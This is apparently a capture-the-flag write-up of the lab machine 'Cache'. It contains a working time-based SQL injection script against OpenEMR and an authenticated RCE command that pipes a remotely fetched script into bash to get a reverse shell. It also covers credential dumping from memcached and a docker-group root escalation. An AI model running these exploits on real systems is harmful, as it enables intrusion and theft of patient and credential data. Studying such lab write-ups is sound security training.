---
layout: default
---

# Cache

# Skills

# Enumeration

Inital port scan showed the following ports opened.

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCb3lyySrN6q6RWe0mdRQOvx8TgDiFAVhicR1h3UlBANr7ElILe7ex89jpzZSkhrYgCF7iArq7PFSX+VY52jRupsYJp7V2XLY9TZOq6F7u6eqsRA60UVeqkh+WnTE1D1GtQSDM2693/1AAFcEMhcwp/Z7nscp+PY1npxEEP6HoCHnf4h4p8RccQuk4AdUDWZo7WlT4fpW1oJCDbt+AOU5ylGUW56n4uSUG8YQVP5WqSspr6IY/GssEw3pGvRLnoJfHjARoT93Fr0u+eSs8zWhpHRWkTEWGhWIt9pPI/pAx2eAeeS0L5knZrHppoOjhR/Io+m0i1kF1MthV+qYjDjscf
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFAHWTqc7a2Az0RjFRBeGhfQkpQrBmEcMntikVFn2frnNPZklPdV7RCy2VW7Ae+LnyJU4Nq2LYqp2zfps+BZ3H4=
|   256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMnbsx7/pCTUKU7WwHrL/d0YS9c99tRraIPvg5zrRpiF
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Cache
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Port 22

- Could be used to enumerate users but nothing else
- Need credentials

# Port 80

- There is a blog, we could use cewl to get a dictionario based on this blog
- We can see domain name (`cache.htb`) that will be added to our **hosts** file.
- May be XSS in contact.html

We can infier that the user `ash` exists because is the creator of the blog. There is login panel that emits a POST request but no data is being transfer, this means that the frontend must be checking the credentials. To confirm this we can check the source code of the `login.html` and find a javascript file called `functionality.js` where we can see clear-text credentials for user ash, `ash:H@v3_fun`

```bash
$(function(){
    
    var error_correctPassword = false;
    var error_username = false;
    
    function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3_fun'){
            alert("Password didn't Match");
            error_correctPassword = true;
        }
    }
    function checkCorrectUsername(){
        var Username = $("#username").val();
        if(Username != "ash"){
            alert("Username didn't Match");
            error_username = true;
        }
    }
    $("#loginform").submit(function(event) {
        /* Act on the event */
        error_correctPassword = false;
         checkCorrectPassword();
         error_username = false;
         checkCorrectUsername();

        if(error_correctPassword == false && error_username ==false){
            return true;
        }
        else{
            return false;
        }
    });
    
});
```

However this credential doesn’t open nothing new, since we cannot use them to login int the web page or in ssh. There is something curious in the user information:

```bash
Check out his other projects like Cache:

HMS(Hospital Management System)
```

Maybe there is anoher domain apart from `cache.htb` .

- cache.htb doesn’t have any subdomain

A good guess for this new subdomain would be `hms.htb` , and actually that’s the hidden domain. Accessing this new domain we have a login panel but our previuos credentials won’t work here either. We are facing an opensource platform used in hospital management, **openEMR**. If we search for vulnerabilities we will see that there are a lot of them, but to use them we need to be authenticated. There is a vulnerability that allow us to bypass the authentication and access some parts of the service. The idea is to see if any of these new accessible parts are vulnerable.

# Foothold

First of all we search in Google that we can access with this authentication bypass exploit. If we review a bit the code we will see that one of them suffers from a SQL injection vulnerability, so let’s try to trigger the vuln. What we are going to do is proxy our request through Burpsuite, where we can control exactly how we send data.

```bash
GET /portal/add_edit_event_user.php?userid=1+AND+sleep(5) HTTP/1.1
Host: hms.htb:80
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Referer: http://hms.htb:80//portal/account/register.php
Cookie: PHPSESSID=j8r5grj5rift8viiridpgibuak
```

Since we cannot see the output we will use a time based SQL injection. Before scripting we need to know the database that we want to query. Since this is a open source project we can go to github a see what tables are avaible in the database. In github we can see references to a table called `users_secure` .

```bash
DROP TABLE IF EXISTS `users_secure`;
CREATE TABLE `users_secure` (
  `id` bigint(20) NOT NULL,
  `username` varchar(255) DEFAULT NULL,
  `password` varchar(255),
  `last_update_password` datetime DEFAULT NULL,
  `last_update` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `password_history1` varchar(255),
  `password_history2` varchar(255),
  `password_history3` varchar(255),
  `password_history4` varchar(255),
  `last_challenge_response` datetime DEFAULT NULL,
  `login_work_area` text,
  `total_login_fail_counter` bigint DEFAULT 0,
  `login_fail_counter` INT(11) DEFAULT '0',
  `last_login_fail` datetime DEFAULT NULL,
  `auto_block_emailed` tinyint DEFAULT 0,
  PRIMARY KEY (`id`),
  UNIQUE KEY `USERNAME_ID` (`id`,`username`)
) ENGINE=InnoDb;
```

We can use the following script to exfiltrate data from the database.

```bash
import signal
import time
import sys
import string
import requests
from pwn import *

'''
Host: hms.htb:80
database-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Referer: http://hms.htb:80//portal/account/register.php
Cookie: PHPSESSID=u3lf92fo13tui0n8l8494tkoiu
'''

def handler(a,b):
    print('[+] Saliendo...')    
    sys.exit(1)
        
signal.signal(signal.SIGINT,handler)

url = 'http://hms.htb/portal/add_edit_event_user.php?userid=%s'
headers = {
    'Host': 'hms.htb:80',
    'database-Agent': 'python-requests/2.31.0',
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Referer': 'http://hms.htb:80//portal/account/register.php',
    'Cookie': 'PHPSESSID=331e7vkkrjpgtmdenqkomdn68t'
}

def get_usernames():
    
    payload_template = "1 and if(SUBSTRING((SELECT username from users_secure where id=1),%s,1) LIKE binary '%s',sleep(15),1)"

    
    p1 = log.progress('Getting user')
    p2 = log.progress('Current user retrieved->')
    username=''
    for pos in range(37 ,500):
        
        
        for letter in string.printable:
            if letter == '%':
                continue
            
            payload = payload_template % (pos,letter)
            final_url = url % payload
            p1.status('Probando con -> %s.Username -> %s' % (payload,username))
            t1 = time.time()
            res = requests.get(url=final_url,headers=headers)
            t2 = time.time()
            if(t2-t1 > 14):
                
                username = username + letter
                break

        p2.status(username)

if __name__ == '__main__':
    get_usernames()
```

The script will dump all, but it can be easily modified to dump the passwords. After this, we end up with a user and credentials, `openemr_admin:$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.` .

Now its time to crack the hash.

```bash
┌──(kali㉿kali)-[~/machines/linux/cache]
└─$ hashcat -m 3200  hash /usr/share/wordlists/rockyou.txt
```

```bash
$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEc...F6P0B.
Time.Started.....: Fri Nov  3 14:16:55 2023 (0 secs)
Time.Estimated...: Fri Nov  3 14:16:55 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2338 H/s (3.49ms) @ Accel:8 Loops:8 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 896/14344387 (0.01%)
Rejected.........: 0/896 (0.00%)
Restore.Point....: 832/14344387 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:24-32
Candidate.Engine.: Device Generator
Candidates.#1....: israel -> musica
Hardware.Mon.#1..: Util: 15%
```

The password `xxxxxx` is valid for the user `openemr_admin` . Now we can use the exploits to gain RCE that requiered authentication. We will be using the following script from **searchsploit**:

```bash
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                                                                                                                                                   | php/webapps/45161.py
```

I will modifiy the script since I have some problems to execute it. In line 136 I will modify how we send the command to execute.

```bash
_cmd = f"|| {args.cmd}"
```

And finally I will execute the command with the following options:

```bash
┌──(kali㉿kali)-[~/machines/linux/cache]
└─$ python 45161.py -u openemr_admin -p xxxxxx -c 'curl 10.10.14.12/rev.sh| bash' http://hms.htb
```

Setting a HTTP server and a listener we get out shell back.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.188] 53920
bash: cannot set terminal process group (1589): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cache:/var/www/hms.htb/public_html/interface/main$ whoami
whoami
```

# Privilege escalation

If we check the users of the machine we have only three with a bash:

- root
- luffy
- ash

If we remember we had the credentials for the user ash, and they can be used to have a shell as this user.

```bash
www-data@cache:/var/www/hms.htb/public_html/interface/main$ su ash
Password: 
ash@cache:/var/www/hms.htb/public_html/interface/main$ whoami
ash
```

Now, if we enumerate the groups of the machine we can see that docker is available and that user luffy is part of the docker group. So if we became luffy we are essentially root.

```bash
ash@cache:/var/www/hms.htb/public_html/interface/main$ grep -riw 'luffy' /etc/ 2>/dev/null
/etc/passwd-:luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
/etc/passwd:luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
/etc/group-:luffy:x:1001:
/etc/group-:docker:x:999:luffy
/etc/subuid:luffy:231072:65536
/etc/ssh/sshd_config:AllowUsers luffy
/etc/subgid:luffy:231072:65536
/etc/group:luffy:x:1001:
/etc/group:docker:x:999:luffy
```

Making som basic enumeration we encounter with the port 11211 open internally. This is the default port for the service memcached. We can connect to this service using **nc**.

```bash
ash@cache:/var/www/hms.htb/public_html/interface/main$ nc localhost 11211

ERROR
help
ERROR
```

Searching we can find in  [https://book.hacktricks.xyz/network-services-pentesting/11211-memcache#dumping-memcache-keys-ver-1.4.31+](https://book.hacktricks.xyz/network-services-pentesting/11211-memcache#dumping-memcache-keys-ver-1.4.31+) how to interact with the service.

```bash
lru_crawler metadump all
key=account exp=-1 la=1699018861 cas=361 fetch=no cls=1 size=75
key=file exp=-1 la=1699018861 cas=362 fetch=no cls=1 size=70
key=passwd exp=-1 la=1699018861 cas=363 fetch=no cls=1 size=74
key=user exp=-1 la=1699018861 cas=364 fetch=no cls=1 size=68
END
```

We can see some keys that probably have a value associated. To get those values we can use the command `get` .

```bash
get passwd
VALUE passwd 0 9
0n3_p1ec3
END
get user
VALUE user 0 5
luffy
```

So we have the following credentials `luffy:0n3_p1ec3` . We can use them to become luffy.

```bash
ash@cache:/$ su luffy 
Password: 
luffy@cache:/$ id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
```

And since we are part of docker group we can escalate privilege pretty easily.

- We create a new container with a volume where we mount the host filesystem in the container route **/mnt**

```bash
luffy@cache:/$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
# whoami
root
# ls
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swap.img  sys  tmp  usr  var  vmlinuz  vmlinuz.old
```

- We are root but inside the container, since the host file system is mounted as a volume we can set the /bin/bash with the SUID command and escalate privileges.

```bash
# chmod u+s /bin/bash
# exit
luffy@cache:/$ ls -la /bin/bash 
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
luffy@cache:/$ bash -p
bash-4.4# whoami
root
```